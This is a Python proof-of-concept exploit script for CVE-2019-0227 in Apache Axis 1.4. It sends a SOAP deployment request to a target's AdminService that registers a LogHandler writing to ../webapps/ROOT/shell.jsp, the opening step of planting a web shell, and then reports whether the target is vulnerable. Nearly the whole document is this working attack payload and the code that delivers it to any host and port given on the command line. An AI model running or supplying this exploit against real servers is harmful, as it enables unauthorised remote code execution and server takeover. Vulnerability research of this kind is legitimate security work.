#!/usr/bin/env python3
#@author: badger
#@date: 2019-10-29
#
import requests
import sys

class PoC(object):
    name = "Apache Axis RCE"
    appName = "Apache Axis"
    appManu = "1.4"
    updateDate = "2019-10-29"
    Plateform = "Windows"
    vulRefer = "CVE-2019-0227"
    shell='''<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns1:deployment
  xmlns="http://xml.apache.org/axis/wsdd/"
  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
  xmlns:ns1="http://xml.apache.org/axis/wsdd/">
  <ns1:service name="RandomService" provider="java:RPC">
    <requestFlow>
      <handler type="RandomLog"/>
    </requestFlow>
    <ns1:parameter name="className" value="java.util.Random"/>
    <ns1:parameter name="allowedMethods" value="*"/>
  </ns1:service>
  <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
    <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />   
    <parameter name="LogHandler.writeToConsole" value="false" /> 
  </handler>
</ns1:deployment>
  </soapenv:Body>
</soapenv:Envelope>'''

    def __init__(self, host, port):
        self.host = str(host)
        self.port = str(port)

    def _getdata(self):
        veri_url = self.host + ':' + self.port + "/axis/services/AdminService"
        headers = {"Content-Type":"application/xml","SOAPAction":"somethi"}
        try:
            res = requests.post("https://"+veri_url, headers=headers, data=self.shell, verify=False)
            return res.text
        except Exception as e:
            # print(e)
            try:
                res = requests.post("http://"+veri_url, headers=headers, data=self.shell)
                return res.text
            except Exception as e:
                # print(e)
                print("Something went wrong.\nUsage: python CVE-2019-0227.py <host> <port>")
                return ''

    def _check(self):
        restext = self._getdata()
        # print(restext)
        if 'processing</Admin>' in restext:
            print("The target is vulnerable to {}.".format(self.vulRefer))
            return True
        else:
            print("The target seem not vulnerable to {}".format(self.vulRefer))
            return False

if __name__ == '__main__':
    try:
        host = sys.argv[1]
        port = sys.argv[2]
    except Exception as e:
        print("Usage: python CVE-2019-0227.py <host> <port>")
        exit(-1)
    poc = PoC(host, port)
    poc._check()
